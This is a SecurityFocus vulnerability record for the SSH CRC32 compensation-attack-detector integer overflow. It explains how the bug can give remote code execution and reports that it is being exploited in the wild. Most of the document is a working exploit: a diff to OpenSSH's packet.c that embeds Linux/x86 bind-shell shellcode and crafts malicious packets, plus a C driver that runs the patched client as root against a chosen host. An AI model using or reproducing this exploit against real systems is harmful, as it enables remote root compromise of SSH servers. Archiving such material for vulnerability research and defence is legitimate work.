source: http://www.securityfocus.com/bid/2347/info

Secure Shell, or SSH, is an encrypted remote access protocol. SSH or code based on SSH is used by many systems all over the world and in a wide variety of commercial applications. An integer-overflow bug in the CRC32 compensation attack detection code may allow remote attackers to write values to arbitrary locations in memory.

This would occur in situations where large SSH packets are recieved by either a client or server, and a 32 bit representation of the SSH packet length is assigned to a 16 bit integer. The difference in data representation in these situations will cause the 16 bit variable to be assigned to zero (or a really low value).

As a result, future calls to malloc() as well as an index used to reference locations in memory can be corrupted by an attacker. This could occur in a manner that can be exploited to write certain numerical values to almost arbitrary locations in memory.

This can lead to an attacker executing arbitrary code with the privileges of the SSH server (usually root) or the SSH client.

**UPDATE**:

There have been reports suggesting that exploitation of this vulnerability may be widespread.

Since early september, independent, reliable sources have confirmed that this vulnerability is being exploited by attackers on the Internet. Security Focus does not currently have the exploit code being used, however this record will be updated if and when it becomes available.

NOTE: Cisco 11000 Content Service Switch family is vulnerable to this issue. All WebNS releases prior, but excluding, versions: 4.01 B42s, 4.10 22s, 5.0 B11s, 5.01 B6s, are vulnerable.

Secure Computing SafeWord Agent for SSH is reportedly prone to this issue, as it is based on a vulnerable version of SSH.

** NetScreen ScreenOS is not directly vulnerable to this issue, however the referenced exploit will cause devices using vulnerable versions of the software to stop functioning properly. This will result in a denial of service condition for NetScreen devices. This issue is in the Secure Command Shell (SCS) administrative interface, which is an implementation of SSHv1. SCS is not enabled on NetScreen devices by default. 

# Exploit code in the form of ssh client patches by Hugo Dias < bsphere@clix.pt >.

- --- packet.c Sat Oct 14 06:23:12 2000
+++ packet.c Tue Feb 20 09:33:00 2001
@@ -68,6 +68,85 @@
 #define DBG(x)
 #endif
 
+
+/*
+ *  Linux/x86
+ *  TCP/36864 portshell (old, could be optimized further)
+ */
+
+char shellcode[] = /* anathema <anathema@hack.co.za> */
+/* main: */
+"\xeb\x72"                                /* jmp callz               */
+/* start: */
+"\x5e"                                    /* popl %esi               */
+
+  /* socket() */
+"\x29\xc0"                                /* subl %eax, %eax         */
+"\x89\x46\x10"                            /* movl %eax, 0x10(%esi)   */
+"\x40"                                    /* incl %eax               */
+"\x89\xc3"                                /* movl %eax, %ebx         */
+"\x89\x46\x0c"                            /* movl %eax, 0x0c(%esi)   */
+"\x40"                                    /* incl %eax               */
+"\x89\x46\x08"                            /* movl %eax, 0x08(%esi)   */
+"\x8d\x4e\x08"                            /* leal 0x08(%esi), %ecx   */
+"\xb0\x66"                                /* movb $0x66, %al         */
+"\xcd\x80"                                /* int $0x80               */
+
+  /* bind() */
+"\x43"                                    /* incl %ebx               */
+"\xc6\x46\x10\x10"                        /* movb $0x10, 0x10(%esi)  */
+"\x66\x89\x5e\x14"                        /* movw %bx, 0x14(%esi)    */
+"\x88\x46\x08"                            /* movb %al, 0x08(%esi)    */
+"\x29\xc0"                                /* subl %eax, %eax         */
+"\x89\xc2"                                /* movl %eax, %edx         */
+"\x89\x46\x18"                            /* movl %eax, 0x18(%esi)   */
+"\xb0\x90"                                /* movb $0x90, %al         */
+"\x66\x89\x46\x16"                        /* movw %ax, 0x16(%esi)    */
+"\x8d\x4e\x14"                            /* leal 0x14(%esi), %ecx   */
+"\x89\x4e\x0c"                            /* movl %ecx, 0x0c(%esi)   */
+"\x8d\x4e\x08"                            /* leal 0x08(%esi), %ecx   */
+"\xb0\x66"                                /* movb $0x66, %al         */
+"\xcd\x80"                                /* int $0x80               */
+
+  /* listen() */
+"\x89\x5e\x0c"                            /* movl %ebx, 0x0c(%esi)   */
+"\x43"                                    /* incl %ebx               */
+"\x43"                                    /* incl %ebx               */
+"\xb0\x66"                                /* movb $0x66, %al         */
+"\xcd\x80"                                /* int $0x80               */
+
+  /* accept() */
+"\x89\x56\x0c"                            /* movl %edx, 0x0c(%esi)   */
+"\x89\x56\x10"                            /* movl %edx, 0x10(%esi)   */
+"\xb0\x66"                                /* movb $0x66, %al         */
+"\x43"                                    /* incl %ebx               */
+"\xcd\x80"                                /* int $0x80               */
+
+  /* dup2(s, 0); dup2(s, 1); dup2(s, 2); */
+"\x86\xc3"                                /* xchgb %al, %bl          */
+"\xb0\x3f"                                /* movb $0x3f, %al         */
+"\x29\xc9"                                /* subl %ecx, %ecx         */
+"\xcd\x80"                                /* int $0x80               */
+"\xb0\x3f"                                /* movb $0x3f, %al         */
+"\x41"                                    /* incl %ecx               */
+"\xcd\x80"                                /* int $0x80               */
+"\xb0\x3f"                                /* movb $0x3f, %al         */
+"\x41"                                    /* incl %ecx               */
+"\xcd\x80"                                /* int $0x80               */
+
+  /* execve() */
+"\x88\x56\x07"                            /* movb %dl, 0x07(%esi)    */
+"\x89\x76\x0c"                            /* movl %esi, 0x0c(%esi)   */
+"\x87\xf3"                                /* xchgl %esi, %ebx        */
+"\x8d\x4b\x0c"                            /* leal 0x0c(%ebx), %ecx   */
+"\xb0\x0b"                                /* movb $0x0b, %al         */
+"\xcd\x80"                                /* int $0x80               */
+
+/* callz: */
+"\xe8\x89\xff\xff\xff"                    /* call start              */
+"/bin/sh";
+
+
 /*
  * This variable contains the file descriptors used for communicating with
  * the other side.  connection_in is used for reading; connection_out for
@@ -125,6 +204,9 @@
 /* Session key information for Encryption and MAC */
 Kex *kex = NULL;
 
+/* Packet Number */
+int count = 0;
+
 void
 packet_set_kex(Kex *k)
 {
@@ -461,6 +543,8 @@
  unsigned int checksum;
  u_int32_t rand = 0;
 
+ count++;
+
  /*
   * If using packet compression, compress the payload of the outgoing
   * packet.
@@ -1172,7 +1256,64 @@
 void
 packet_write_poll()
 {
- - int len = buffer_len(&output);
+ int len;
+ char buf[50],*p,*ptr;
+ char code[270000];
+ long sz;
+ FILE *f; 
+
+ if (count == 2)
+ {
+  f = fopen("/tmp/code","r");
+  fgets(buf,28,f); 
+  fclose(f);  
+
+  sz = GET_32BIT(&buf[24]);
+  buffer_clear(&output);
+  buffer_append(&output,code,sz); 
+ 
+  len = buffer_len(&output);
+
+    ptr = buffer_ptr(&output); 
+
+  for(p = ptr + 4 ; p < ptr + GET_32BIT(&buf[16]) ; p+=8)
+  {
+  *p=buf[0];
+  *(p+1)=buf[1];
+  *(p+2)=buf[2];
+  *(p+3)=buf[3];
+  *(p+4)=buf[4];
+  *(p+5)=buf[5];
+  *(p+6)=buf[6];
+  *(p+7)=buf[7];
+  }
+
+  sz = ((GET_32BIT(&buf[20]) + 8) & ~7);
+
+  for(p = p ; p < ptr + sz ; p+=8)
+  {
+  *p=buf[8];
+  *(p+1)=buf[9];
+  *(p+2)=buf[10];
+  *(p+3)=buf[11];
+  *(p+4)=buf[12];
+  *(p+5)=buf[13];
+  *(p+6)=buf[14];
+  *(p+7)=buf[15];
+  }
+
+  sz = len - GET_32BIT(&buf[20]);
+ 
+  memset(p,'\x90',sz);
+  memcpy(p+sz-strlen(shellcode)-16,&shellcode,strlen(shellcode));
+  memcpy(ptr,&buf[20],4); 
+
+  count++;
+ }
+
+ len = buffer_len(&output);
+
+
  if (len > 0) {
   len = write(connection_out, buffer_ptr(&output), len);
   if (len <= 0) {
@@ -1299,3 +1440,4 @@
  max_packet_size = s;
  return s;
 }
+

- ------------------------------------------------------------------------------------

/* 

THIS FILE IS FOR EDUCATIONAL PURPOSE ONLY.

BlackSphere - Hugo Oliveira Dias
Tue Feb 20 16:18:00 2001

Email: bsphere@clix.pt
Homepage: http://planeta.clix.pt/bsphere

Exploit code for using the modified ssh

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

/* Path to modified ssh */
#define PATH_SSH "./ssh"

int main(int argc,char *argv[])
{
 int f;
 int port;
 unsigned long addr,*ptr;
 char *buffer,*aux,ch,*ssh;
 int i;

 if (argc < 8)
 {
  printf("\nUsage : %s <saved eip> <count> <packet length> <username length> <host> \
<port> <h(i)>\n\n",argv[0]);
 
  fflush(stdout);
  _exit(0);
 }

 port=atoi(argv[6]);

 buffer = (char *) malloc(29);

 ptr = (unsigned long *) buffer;

 *(ptr++) = 1543007393 + strtoul(argv[1],0,10);
 *(ptr++) = 0;
 *(ptr++) = strtoul(argv[7],0,10);
 *(ptr++) = 0;
 *(ptr++) = 16520 + strtoul(argv[2],0,10);
 *(ptr++) = strtoul(argv[3],0,10);
 *(ptr++) = strtoul(argv[4],0,10);

 buffer[29]=0;

 for(i = 0 ; i < 27 ; i+=4)
 {
  aux = buffer + i;
  ch=*aux;
  *aux=*(aux+3);
  *(aux+3)=ch;
  ch=*(aux+1);
  *(aux+1)=*(aux+2);
  *(aux+2)=ch; 
 } 

 printf("\nSaved Eip : &h + %u",1543007393 + strtoul(argv[1],0,10));
 printf("\nReturn Address : 0x%xxxxx",(16520+strtoul(argv[2],0,10))/8);
 printf("\nPacket Length : %u",(strtoul(argv[3],0,10)+8) & ~7);
 printf("\nUsername Length : %u\n\n",strtoul(argv[4],0,10));
 fflush(stdout);
 

 f = open("/tmp/code",O_RDWR | O_CREAT,S_IRWXU);
 write(f,buffer,28);
 close(f);

 ssh = (char *) malloc(strlen(PATH_SSH) + 100 + strlen(argv[5]));

 strcpy(ssh,PATH_SSH);

 sprintf(ssh+strlen(PATH_SSH)," -p %i -v -l root %s",port,argv[5]);
 
 printf("%s\n",ssh);

 system(ssh);

 _exit(0); 
}